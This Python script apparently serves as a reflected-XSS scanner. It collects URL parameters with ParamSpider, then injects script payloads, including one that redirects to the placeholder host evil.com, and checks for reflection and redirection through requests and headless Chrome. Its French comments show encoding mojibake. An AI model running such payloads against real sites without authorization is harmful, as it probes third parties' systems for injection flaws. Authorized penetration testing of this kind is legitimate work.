import requests
from itertools import product
import subprocess
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from urllib.parse import quote, urlparse
import time
import urllib.parse
import webbrowser
import os
import subprocess
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
import tempfile
import re



def lancer_paramspider(url):
    try:
        print(f"[+] Lancement de : paramspider -d {url}")
        subprocess.run(["paramspider", "-d", url], check=True)
    except subprocess.CalledProcessError as e:
        print("[-] Erreur pendant l'ex√©cution de ParamSpider.")
        print(e)
def scan_XSS(target_url):
    # Payloads XSS √† tester
    xss_payloads = [
        "<script>alert(1)</script>"
    ]

    # Charger les URLs depuis un fichier
    input_file = f"results/{target_url}.txt"
    output_file = f"results/{target_url}_result.txt"

    if not os.path.exists(input_file):
        print(f"[!] Le fichier {input_file} n'existe pas.")
        return

    with open(input_file, "r") as f:
        raw_urls = [line.strip() for line in f if "FUZZ" in line]

    headers = {
        "User-Agent": "Mozilla/5.0 (XSS-Scanner)"
    }

    # Stocker les URLs d√©j√† test√©es pour √©viter les doublons
    tested_urls = set()

    print(f"üîç Test de {len(raw_urls)} URLs avec permutations...\n")

    found_vulns = []

    for base_url in raw_urls:
        fuzz_count = base_url.count("FUZZ")
        if fuzz_count == 0:
            continue

        for payload in xss_payloads:
            # G√©n√©rer toutes les combinaisons possibles de remplacement de FUZZ
            combos = list(product([payload, "FUZZ"], repeat=fuzz_count))

            for combo in combos:
                test_url = base_url
                for replacement in combo:
                    test_url = test_url.replace("FUZZ", replacement, 1)

                # Cl√© unique pour chaque URL test√©e
                unique_key = (test_url, payload)
                if unique_key in tested_urls:
                    continue  # Ignorer les doublons

                tested_urls.add(unique_key)

                try:
                    response = requests.get(test_url, headers=headers, timeout=5)
                    if payload in response.text:
                        print("‚ö†Ô∏è  Vuln√©rabilit√© XSS potentielle trouv√©e !")
                        print(f"    ‚ûú Payload : {payload}")
                        print(f"    ‚ûú URL     : {test_url}\n")

                        found_vulns.append(f"Payload: {payload}\nURL: {test_url}\n\n")
                except requests.RequestException as e:
                    print(f"[!] Erreur de requ√™te : {e}")

    # √âcrire les r√©sultats dans un fichier
    with open(output_file, "w") as f_out:
        if found_vulns:
            f_out.writelines(found_vulns)
            print(f"‚úÖ R√©sultats enregistr√©s dans : {output_file}")
        else:
            f_out.write("Aucune vuln√©rabilit√© XSS trouv√©e.\n")
            print("‚úÖ Aucun r√©sultat √† enregistrer (aucune vuln√©rabilit√© XSS trouv√©e).")
                    

def test_xss_redirection(base_url: str):
    """
    Teste la redirection XSS vers evil.com en lisant la 2·µâ ligne du fichier
    results/<base_url_sans_schema>_result.txt (sans les 5 premiers caract√®res
    et sans "<script>alert(1)</script>"), puis enregistre le r√©sultat de la
    d√©tection directement dans ce m√™me fichier.

    Args:
        base_url (str): URL de base (ex: "http://example.com/page" ou "https://vulnweb.com").
                        Avant de former le nom de fichier, on retire le sch√©ma HTTP/HTTPS.

    Returns:
        tuple: (redirection_detect√©e: bool, url_finale: str)
    """

    # 1) On retire le sch√©ma "http://" ou "https://" de base_url
    base_url_sans_schema = re.sub(r"^https?://", "", base_url)
    # On remplace les slashs "/" par "_" pour que le nom de fichier soit valide.
    base_url_sans_schema = base_url_sans_schema.replace("/", "_")

    # 2) Construction du chemin du fichier r√©sultat
    fichier_result = f"results/{base_url_sans_schema}result.txt"
    if not os.path.exists(fichier_result):
        print(f"[‚ùå] Le fichier {fichier_result} n'existe pas.")
        return False, ""

    # 3) Lecture des lignes du fichier
    try:
        with open(fichier_result, "r", encoding="utf-8") as f:
            lignes = f.readlines()
    except Exception as e:
        print(f"[‚ö†Ô∏è] Impossible de lire {fichier_result} : {e}")
        return False, ""

    # 4) V√©rification qu'il y a bien au moins 2 lignes
    if len(lignes) < 2:
        print(f"[‚ùå] {fichier_result} ne contient pas assez de lignes (moins de 2).")
        return False, ""

    # 5) On extrait la 2·µâ ligne (index 1), on supprime le "\n", puis on retire les 5 premiers caract√®res
    ligne2 = lignes[1].rstrip("\n")
    if len(ligne2) <= 5:
        print(f"[‚ùå] La deuxi√®me ligne de {fichier_result} est trop courte pour retirer 5 caract√®res : '{ligne2}'")
        return False, ""
    real_base_url = ligne2[5:].strip()

    # 6) On supprime s'il existe "<script>alert(1)</script>"
    real_base_url = real_base_url.replace("<script>alert(1)</script>", "").strip()
    print(f"[‚ÑπÔ∏è] URL extraite (apr√®s retrait des 5 premiers caract√®res et suppression du script) : {real_base_url}")

    # 7) Pr√©paration du payload XSS (qui force une redirection vers evil.com)
    payload = '<script>window.location.href="https://evil.com"</script>'
    encoded_payload = urllib.parse.quote(payload, safe="")

    # 8) Construction de l'URL de test
    #    Si real_base_url n'a pas d√©j√† "?" ou "=" en fin, il faudra peut-√™tre ajouter "?" avant le payload.
    #    Ici on concat√®ne en supposant que la 2·µâ ligne se termine correctement pour recevoir la charge.
    target_url = f"{real_base_url}{encoded_payload}"
    print(f"[‚ÑπÔ∏è] URL de test construite avec payload : {target_url}")

    # 9) Envoi de la requ√™te GET (suivi des redirections)
    try:
        response = requests.get(target_url, allow_redirects=True, timeout=5)
        final_url = response.url
        redirige = "evil.com" in final_url

        if redirige:
            print(f"[‚úÖ] Redirection d√©tect√©e vers : {final_url}")

            # Ouverture dans le navigateur pour v√©rification visuelle (optionnel)
            process = subprocess.Popen(["xdg-open", target_url])
            time.sleep(5)
            process.terminate()
            time.sleep(1)
            if process.poll() is None:
                process.kill()
        else:
            print(f"[‚ùå] Pas de redirection vers evil.com. URL finale : {final_url}")

    except requests.RequestException as e:
        print(f"[‚ö†Ô∏è] Erreur r√©seau lors de la requ√™te : {e}")
        # M√™me en cas d'erreur r√©seau, on souhaite enregistrer le fait qu'on n'a pas pu d√©tecter de redirection
        redirige = False
        final_url = f"ErreurRequete: {e}"

    # 10) On enregistre le r√©sultat dans le m√™me fichier (en mode append)
    try:
        with open(fichier_result, "a", encoding="utf-8") as f:
            statut = "TRUE" if redirige else "FALSE"
            # Exemple de ligne ajout√©e : "RedirectionXSS=TRUE; FinalURL=https://evil.com/‚Ä¶"
            f.write(f"RedirectionXSS={statut}; FinalURL={final_url}\n")
        print(f"[‚ÑπÔ∏è] R√©sultat de la redirection enregistr√© dans {fichier_result}.")
    except Exception as e:
        print(f"[‚ö†Ô∏è] Impossible d'√©crire dans {fichier_result} : {e}")

    return redirige, final_url 

def test_XSS(target_url):


    xss_payload = '<script>window.location.href="https://evil.com"</script>'
    encoded_payload = quote(xss_payload)

    try:
        with open(f"results/{target_url}.txt", "r") as f:
            raw_urls = [line.strip() for line in f if "FUZZ" in line]
    except FileNotFoundError:
        print(f"[‚ùå] Fichier results/{target_url}.txt introuvable.")
        return

    tested_urls = set()
    print(f"üîç Test de {len(raw_urls)} URLs avec navigateur (Selenium)...\n")

    # Configuration compatible avec ex√©cution root
    temp_profile = f"/tmp/chrome-profile-{os.getpid()}"
    options = Options()
    options.add_argument("--headless")
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-gpu")
    options.add_argument("--disable-dev-shm-usage")
    options.add_argument("--remote-debugging-port=9222")
    options.add_argument(f"--user-data-dir={temp_profile}")

    service = Service("/usr/bin/chromedriver")
    driver = webdriver.Chrome(service=service, options=options)

    for base_url in raw_urls:
        if "FUZZ" not in base_url:
            continue

        test_url = base_url.replace("FUZZ", encoded_payload)
        if test_url in tested_urls:
            continue
        tested_urls.add(test_url)

        print(f"üåê Test navigateur de : {test_url}")
        try:
            driver.get(test_url)
            time.sleep(3)  # Attendre la redirection JS

            final_url = driver.current_url
            parsed_url = urlparse(final_url)
            print("üåê Domaine d√©tect√© :", parsed_url.netloc)
            redirige = parsed_url.netloc in ["evil.com", "www.evil.com"]

            if redirige:
                print("[‚úÖ] Redirection JS d√©tect√©e vers :", final_url)
                print("üõë Scan arr√™t√© suite √† une redirection confirm√©e.")
                driver.quit()
                return
            else:
                print("[‚ùå] Pas de redirection JS. URL finale :", final_url)

        except Exception as e:
            print("[‚ö†Ô∏è] Erreur navigateur :", e)

    driver.quit()


                    
if __name__ == "__main__":
    url = input("Entrez l'URL (domaine) cible (ex: example.com) : ").strip()
    lancer_paramspider(url)
    scan_XSS(url)
    test_XSS(url) 
